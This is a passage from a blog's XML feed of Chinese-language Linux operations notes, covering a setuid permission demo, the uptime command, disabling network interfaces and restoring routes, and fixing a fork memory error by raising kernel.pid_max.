class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ id<br>uid=1002(nc0) gid=1002(nc0) groups=1002(nc0)<br>$ cd /opt/nc0<br>$ ls -lat<br>total 36<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 23 </span>17:06 .<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0del.txt<br>-rwSr--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 68 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0.sh<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root root <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 22 </span>22:42 ..<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>$ bash nc0.sh<br>*当前登陆的用户名:nc0   UID:1002<br>rm: cannot remove &#x27;nc0del.txt&#x27;: Permission denied<br>$<br></code></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.cnblogs.com/lsdb/p/12197090.html">https://www.cnblogs.com/lsdb/p/12197090.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uptime</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/uptime/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/uptime/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a>uptime</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># uptime</span><br> 23:36:12 up<span class="hljs-number"> 59 </span>days, 14:03, <span class="hljs-number"> 2 </span>users,  load average: 0.06, 0.09, 0.07<br></code></pre></td></tr></table></figure><p>当前时间：23:36:12</p><p>系统运行状态：up</p><p>系统已运行时间：59 days, 14:03，已运行59天14小时3分钟</p><p>当前登录用户数：2 users</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# who<br>root     tty1         2022<span class="hljs-string">-06</span><span class="hljs-string">-26</span> 09:35<br>root     pts/0        2022<span class="hljs-string">-08</span><span class="hljs-string">-24</span> 22:39 (125.33.205.114)<br></code></pre></td></tr></table></figure><p>系统负载：load average: 0.06, 0.09, 0.07</p><p>过去1分钟，5分钟和15分钟的平均负载</p><h2 id="uptime-p-系统运行时间"><a href="#uptime-p-系统运行时间" class="headerlink" title="uptime -p 系统运行时间"></a>uptime -p 系统运行时间</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># uptime -p</span><br>up<span class="hljs-number"> 8 </span>weeks,<span class="hljs-number"> 3 </span>days,<span class="hljs-number"> 14 </span>hours,<span class="hljs-number"> 11 </span>minutes<br></code></pre></td></tr></table></figure><h2 id="uptime-s-系统启动时间"><a href="#uptime-s-系统启动时间" class="headerlink" title="uptime -s 系统启动时间"></a>uptime -s 系统启动时间</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># uptime -s</span><br><span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-26</span> <span class="hljs-number">09</span>:<span class="hljs-number">32</span>:<span class="hljs-number">57</span><br></code></pre></td></tr></table></figure><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><p>&#x2F;var&#x2F;run&#x2F;utmp</p><p>&#x2F;proc</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ifdown</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/ifdown/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/ifdown/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="禁用网卡"><a href="#禁用网卡" class="headerlink" title="禁用网卡"></a>禁用网卡</h1><h2 id="查询网卡信息"><a href="#查询网卡信息" class="headerlink" title="查询网卡信息"></a>查询网卡信息</h2><p>使用<strong>ifconfig</strong>，不要使用<strong>ip a</strong></p><p>ip a 命令查询出来的网卡名存在问题</p><p>同台机器</p><p>ip  a : eth0.200@eth0</p><p>ifconfig :  eth0.200</p><p>示例：</p><p>ifconfig</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vim">[root@localhost tmp]# ifconfig<br>eth0      Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:552883003</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:253865444</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          RX byte<span class="hljs-variable">s:130369806378</span> (<span class="hljs-number">121.4</span> GiB)  TX byte<span class="hljs-variable">s:129966960922</span> (<span class="hljs-number">121.0</span> GiB)<br>          Interrup<span class="hljs-variable">t:35</span> <br><br>eth0.<span class="hljs-number">100</span>  Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet addr:<span class="hljs-number">10.122</span>.<span class="hljs-number">11.73</span>  Bcas<span class="hljs-variable">t:10</span>.<span class="hljs-number">122.11</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:232635875</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:216156572</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">0</span> <br>          RX byte<span class="hljs-variable">s:102014135177</span> (<span class="hljs-number">95.0</span> GiB)  TX byte<span class="hljs-variable">s:125048629002</span> (<span class="hljs-number">116.4</span> GiB)<br><br>eth0.<span class="hljs-number">200</span>  Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet addr:<span class="hljs-number">27.221</span>.<span class="hljs-number">32.56</span>  Bcas<span class="hljs-variable">t:27</span>.<span class="hljs-number">221.32</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:29247955</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:5423171</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">0</span> <br>          RX byte<span class="hljs-variable">s:1599611720</span> (<span class="hljs-number">1.4</span> GiB)  TX byte<span class="hljs-variable">s:765012049</span> (<span class="hljs-number">729.5</span> MiB)<br></code></pre></td></tr></table></figure><p>ip a</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pf">[root@localhost tmp]<span class="hljs-comment"># ip a</span><br><span class="hljs-number">1</span>: lo: <span class="hljs-variable">&lt;LOOPBACK,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">16436</span> qdisc noqueue <span class="hljs-keyword">state</span> UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>    <span class="hljs-keyword">inet6</span> ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc mq <span class="hljs-keyword">state</span> UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">3</span>: eth1: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">85</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">4</span>: eth2: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">86</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">5</span>: eth3: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">87</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">8</span>: eth0.<span class="hljs-number">100</span>@eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noqueue <span class="hljs-keyword">state</span> UP <br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">10.122</span>.<span class="hljs-number">11.73</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.122</span>.<span class="hljs-number">11.255</span> scope <span class="hljs-keyword">global</span> eth0.<span class="hljs-number">100</span><br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">11</span>: eth0.<span class="hljs-number">200</span>@eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noqueue <span class="hljs-keyword">state</span> UP <br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">27.221</span>.<span class="hljs-number">32.56</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">27.221</span>.<span class="hljs-number">32.255</span> scope <span class="hljs-keyword">global</span> eth0.<span class="hljs-number">200</span><br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><h2 id="禁用网卡-1"><a href="#禁用网卡-1" class="headerlink" title="禁用网卡"></a>禁用网卡</h2><p>语法：</p><p>ifdown <device name></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> tmp]<span class="hljs-meta"># ifdown <span class="hljs-string">&quot;eth0.200&quot;</span></span><br></code></pre></td></tr></table></figure><p>ifconfig <device name> down</p><h2 id="启用网卡"><a href="#启用网卡" class="headerlink" title="启用网卡"></a>启用网卡</h2><p>语法：</p><p>ifup <device name></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><h3 id="网络不通"><a href="#网络不通" class="headerlink" title="网络不通"></a>网络不通</h3><h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><p>操作网卡可能会导致对应网卡路由丢失，从而导致网络不通</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>备份路由，恢复路由</p><p>1、操作网卡之前备份路由，恢复路由</p><p>route 或 route -n</p><p>2、如果没有备份路由，可以尝试查看&#x2F;etc&#x2F;rc.local文件找路由信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[root@localhost /]# cat /etc/rc.local<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This script will be executed *after* all the other init scripts.</span><br><span class="hljs-comment"># You can put your own initialization stuff in here if you don&#x27;t</span><br><span class="hljs-comment"># want to do the full Sys V style init stuff.</span><br><br>touch /var/lock/subsys/local<br>/var/cfengine/bin/cfagent -qvv; sleep 60; /var/cfengine/bin/cfagent -qvv<br>modprobe toa<br>/etc/rc3.d/S27route<br><br>[root@localhost /]# cat /etc/rc3.d/S27route<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.74.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.78.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.48.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.68.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.0.0.0/8 gw 172.16.108.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 172.16.0.0/16 gw 172.16.108.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 192.168.0.0/16 gw 172.16.108.1<br><br></code></pre></td></tr></table></figure><p>执行对应的路由操作即可</p><p>处理前后对比</p><p>处理前，内网eth1不通的路由</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@localhost ata]<span class="hljs-comment"># route </span><br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>218.xx.xx.0    *               255.255.255.0   U    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>172.16.108.0    *               255.255.255.0   U    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth1<br>10.48.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>10.68.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>10.74.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>link-local      *               255.255.0.0     U    <span class="hljs-number"> 1002 </span> <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>link-local      *               255.255.0.0     U    <span class="hljs-number"> 1003 </span> <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth1<br>10.78.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>default         218.xx.xx.1    0.0.0.0         UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br></code></pre></td></tr></table></figure><p>处理前，内网eth1通的路由</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[root@localhost /]</span># route -n<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br><span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">0</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">172.16.108.0</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.48.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">10.68.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">172.16.0.0</span>      <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.74.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">169.254.0.0</span>     <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     U     <span class="hljs-number">1002</span>   <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">169.254.0.0</span>     <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     U     <span class="hljs-number">1003</span>   <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">192.168.0.0</span>     <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.78.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">10.0.0.0</span>        <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>       UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">0.0.0.0</span>         <span class="hljs-number">218</span>.<span class="hljs-number">30</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_fork_cannot_allocate_memory</title>
    <link href="/2024/04/03/yunwei/errors/Linuxerrors/error_fork_cannot_allocate_memory/"/>
    <url>/2024/04/03/yunwei/errors/Linuxerrors/error_fork_cannot_allocate_memory/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CentOS6中终端中执行命令提示报错</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@web-<span class="hljs-number">54</span> vsftpd]<span class="hljs-comment"># service vsftpd status</span><br><span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>functions: fork: Cannot allocate memory<br><span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>functions: fork: Cannot allocate memory<br></code></pre></td></tr></table></figure><h2 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h2><p>系统进程数不足导致</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h3><h4 id="查看Linux最大进程数配置"><a href="#查看Linux最大进程数配置" class="headerlink" title="查看Linux最大进程数配置"></a>查看Linux最大进程数配置</h4><p>sysctl kernel.pid_max</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl kernel.pid_max</span><br><span class="hljs-attr">kernel.pid_max</span> = <span class="hljs-number">32768</span><br></code></pre></td></tr></table></figure><h4 id="查看当前Linux进程数"><a href="#查看当前Linux进程数" class="headerlink" title="查看当前Linux进程数"></a>查看当前Linux进程数</h4><p>ps -eLf | wc -l</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@web</span><span class="hljs-number">-54</span> vsftpd]<span class="hljs-meta"># ps -eLf | wc -l</span><br><span class="hljs-number">32610</span><br></code></pre></td></tr></table></figure><h3 id="具体解决方案"><a href="#具体解决方案" class="headerlink" title="具体解决方案"></a>具体解决方案</h3><p>进程数即将到设置的上线，修改最大进程数配置</p><h4 id="临时生效"><a href="#临时生效" class="headerlink" title="临时生效"></a>临时生效</h4><p>echo 1000000 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># echo 1000000 &gt; /proc/sys/kernel/pid_max</span><br><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl kernel.pid_max</span><br><span class="hljs-attr">kernel.pid_max</span> = <span 